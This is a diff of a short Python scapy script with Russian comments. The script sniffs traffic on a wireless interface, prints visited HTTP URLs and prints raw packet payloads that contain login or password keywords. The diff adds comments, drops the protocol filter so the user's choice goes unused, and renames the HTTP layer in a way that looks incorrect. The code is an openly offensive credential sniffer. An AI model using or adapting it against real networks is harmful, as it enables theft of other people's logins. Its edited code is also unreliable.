@@ -4,7 +4,7 @@ from scapy.layers import http
 #pip install scapy_http
 
 print('Выберите протокол, по которому будут фильтроваться данные')
-filter_sniff = str(input('(прим. udp -> 1, tcp ->2, arp -> 3, port -> port <number>): '))
+filter_sniff = str(input('(прим. udp -> 1, tcp ->2, arp -> 3, port -> port <number>): ')) #Выбор протокола или порта для прослушивания 
 if filter_sniff == '1':
     filter_sniff = 'udp'
 if filter_sniff == '2':
@@ -13,18 +13,17 @@ if filter_sniff == '3':
     filter_sniff = 'arp'
 
 def sniff(interface):
-    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet, filter = filter_sniff)
+    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)
 
 def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest): #Отбираем пакеты с http
-        url = packet[http.HTTPREQUEST].Host + packet[http.HTTPREQUEST].Path
+    if packet.haslayer(http.HTTPREQUEST): #Отбираем пакеты с http
+        url = packet[http.HTTPREQUEST].Host + packet[http.HTTPREQUEST].Path #Совмещаем первую и вторую часть url 
         print(url) #Просматриваем url адреса
-
-        if packet.haslayer(scapy.Raw): #Просматриваем логин и пароль
-            load = packet[scapy.Raw].load
-            keywords = ['username', 'user', 'login', 'password', 'pass']
+        if packet.haslayer(scapy.Raw): 
+            load = packet[scapy.Raw].load 
+            keywords = ['username', 'user', 'login', 'password', 'pass'] #Возможные варианты надписи логина на сайтах для перебора
             for keyword in keywords:
                 if keyword in load:
-                    print(load)
+                    print(load) #Просматриваем логин и пароль
                     break
 sniff('wlan0')
